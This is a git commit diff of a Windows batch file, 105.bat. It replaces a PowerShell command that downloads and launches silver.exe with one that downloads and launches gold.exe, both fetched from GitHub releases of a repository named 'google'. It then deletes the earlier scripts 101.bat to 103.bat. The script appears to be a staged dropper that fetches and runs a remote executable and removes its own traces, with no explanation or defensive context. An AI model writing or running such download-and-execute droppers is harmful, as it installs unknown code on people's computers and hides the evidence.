841d184169c578b8ce8ae2433837d78c651ab06d
Victor Francis <cisfran05@protonmail.com>
2023-11-05 15:53:53 +0100

    Update 105.bat

--- 105.bat
+++ 105.bat
@@ -1,5 +1,5 @@
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/Cisfran05/google/releases/download/v1.0/silver.exe', '.\silver.exe') }
-start silver.exe
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/Cisfran05/google/releases/download/v2.0/gold.exe', '.\gold.exe') }
+start gold.exe
 del "101.bat"
 del "102.bat"
 del "103.bat"
